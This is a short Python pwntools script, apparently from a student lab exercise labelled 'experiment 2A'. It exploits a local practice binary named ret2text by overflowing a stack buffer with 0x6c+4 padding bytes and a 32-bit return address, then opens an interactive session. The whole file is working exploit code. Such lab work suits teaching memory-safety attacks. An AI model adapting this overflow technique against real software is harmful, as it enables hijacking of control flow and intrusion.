'''
Author: p0p1ng
Date: 2023-11-17 20:11:52
LastEditTime: 2023-11-18 19:49:31
Description: 
FilePath: /实验2A/exp1.py
'''
from pwn import *

sh = process('./ret2text')
retaddr = 0x804863a
sh.sendline(b'A' * (0x6c+4) + p32(retaddr))
sh.interactive()